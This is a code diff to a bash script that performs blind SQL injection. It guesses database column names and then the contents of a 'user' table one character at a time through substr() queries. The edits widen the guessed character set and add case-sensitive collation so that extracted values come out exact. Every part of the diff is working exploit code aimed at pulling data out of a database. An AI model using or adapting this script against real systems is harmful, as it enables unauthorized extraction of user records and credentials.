@@ -115,8 +115,9 @@ function bruteForceName() {
 			# sql function 'substr()' starts at the number one and not with zero
 			extractionStartPosition=$((i+1))
 			offset=$index
-			for letter in {{a..z},@,_,\ ,$,.,/,{A..Z},{0..9}}; do
+			for letter in {{a..z},@,_,\ ,$,.,/,{,},?,{A..Z},{0..9}}; do
 				sqli="$(printf "${placeholderSqli}" "$extractionStartPosition" "$offset" "$letter")"
+
 				request "${sqli}"
 				result=$(echo $?)
 				#echo "result => $result"
@@ -127,6 +128,7 @@ function bruteForceName() {
 			done
 		done
 		# add to <string list> and clean the variable 'name'
+
 		list+="${name} "
 		name=''
 	done
@@ -194,7 +196,7 @@ for table in ${object['nameOfTables']}; do
         object['lengthOfColumns']=$(getLength "$sqlQuery" "${object['amountOfColumns']}")
 	echo "${object['lengthOfColumns']}"
 	# names
-	sqlQuery="SELECT substr(LOWER(column_name), %d,1) FROM information_schema.columns WHERE table_schema = '${object['toSearchedDatabase']}' AND table_name = '${table}' LIMIT 1 OFFSET %d"
+	sqlQuery="SELECT substr(column_name, %d,1) FROM information_schema.columns WHERE table_schema = '${object['toSearchedDatabase']}' AND table_name = '${table}' LIMIT 1 OFFSET %d"
         object['namesOfColumns']=$(bruteForceName "$sqlQuery" "${object['amountOfColumns']}" "${object['lengthOfColumns']}")
 	echo "The table ${table} has the follwing columns ${object['namesOfColumns']}"
 
@@ -220,9 +222,10 @@ for column in ${object['namesOfColumns']}; do
         object['lengthOfContent']=$(getLength "$sqlQuery" "${object['amountOfContent']}")
         echo "${object['lengthOfContent']}"
         # names
-        sqlQuery="SELECT substr($column, %d,1) FROM user LIMIT 1 OFFSET %d"
-        object['namesOfContent']=$(bruteForceName "$sqlQuery" "${object['amountOfContent']}" "${object['lengthOfContent']}")
-        echo "${object['namesOfContent']}"
+	sqlQuery="SELECT substr($column COLLATE utf8mb4_bin, %d,1) FROM user LIMIT 1 OFFSET %d"
+        #object['namesOfContent']=$(bruteForceName "$sqlQuery" "${object['amountOfContent']}" "${object['lengthOfContent']}")
+        bruteForceName "$sqlQuery" "${object['amountOfContent']}" "${object['lengthOfContent']}" 5
+        #echo "${object['namesOfContent']}"
 
 done
 
